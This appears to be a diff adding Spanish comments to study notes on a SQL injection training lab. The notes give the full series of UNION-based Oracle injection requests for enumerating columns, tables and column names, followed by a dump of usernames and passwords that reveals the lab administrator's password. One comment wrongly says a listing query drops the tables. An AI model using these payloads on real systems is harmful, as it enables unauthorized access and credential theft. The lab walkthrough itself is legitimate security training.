@@ -1,17 +1,27 @@
+
 Lab: SQL injection attack, listing the database contents on Oracle
 
+## con este comando enumeras las columnas de la bbdd ##
 GET /filter?category=Lifestyle'+order+by+2-- HTTP/1.1
+
+
+## Con este comando verificas el tipo de dato que entra en la BBDD ##
 GET /filter?category=Lifestyle'+UNION+SELECT+'a',+'a'+FROM+dual-- HTTP/1.1 [ORACLE DB]
+
+## [ORACLE] Con este SQLi dropeas todas las tablas de oracle ##
 GET /filter?category=Lifestyle'+UNION+SELECT+table_name,+NULL+FROM+all_tables-- HTTP/1.1  [All tables de oracle]
 
-	USERS_LGCHBG
+	USERS_LGCHBG  --> esta es la que buscamos en el ejercicio
 
+## [ORACLE] Con este comando listas todas las columnas de una tabla específica, en este caso la tabla es USERS_LGCHBG ##
 GET /filter?category=Lifestyle'+UNION+SELECT+column_name,+null+from+all_tab_columns+where+table_name+%3d+'USERS_LGCHBG'-- HTTP/1.
 
 USERNAME_SLVANQ
 PASSWORD_SMEPZI
 
-
+## [ORACLE] Este comando sirve para checkear el contenido de las columnas dentro de una tabla. Las columnas son USERNAME_SLVANQ & PASSWORD_SMEPZI, dentro de la tabla USERS_LGCHBG ##
 GET /filter?category=Lifestyle'+UNION+SELECT+USERNAME_SLVANQ,+PASSWORD_SMEPZI+from+USERS_LGCHBG-- HTTP/1.1
 <th>administrator</th>
 <td>kzorxuda9wkdpsa06s7q
+
+
